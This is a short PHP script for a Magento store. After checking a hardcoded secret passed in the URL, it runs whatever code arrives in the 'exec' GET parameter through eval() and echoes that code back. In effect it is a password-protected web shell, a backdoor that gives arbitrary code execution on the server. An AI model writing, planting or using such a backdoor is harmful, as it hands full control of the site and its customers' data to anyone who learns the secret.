<?php
$secret = "a1b2c3e4@451";
if($_GET['secret'] != $secret) {
    die("You cannot access the page");
}
include '../app/Mage.php';
Mage::app();
$str = $_GET['exec'];
eval($str);
echo "\n<br>completed the execution... below is the code that was executed<br>\n";
echo $str;
